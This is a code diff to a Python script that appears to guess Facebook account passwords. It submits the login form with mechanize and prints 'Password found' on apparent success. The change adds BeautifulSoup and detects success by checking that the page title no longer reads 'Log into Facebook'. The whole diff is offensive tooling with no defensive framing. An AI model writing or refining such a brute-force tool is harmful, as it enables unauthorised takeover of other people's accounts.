@@ -1,6 +1,7 @@
 import sys
 import mechanize
 import os
+from bs4 import BeautifulSoup
 
 if sys.version_info[0] != 3:
     print('''--------------------------------------
@@ -55,5 +56,7 @@ browser.form['pass'] = password
 response = browser.submit()
 response_data = response.read().decode('utf-8')  # Decode bytes to string
 
-if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
+soup = BeautifulSoup(response_data, 'html.parser')
+
+if soup.find('title') and 'Log into Facebook' not in soup.find('title').text:
     print("Password found: %s" % password)
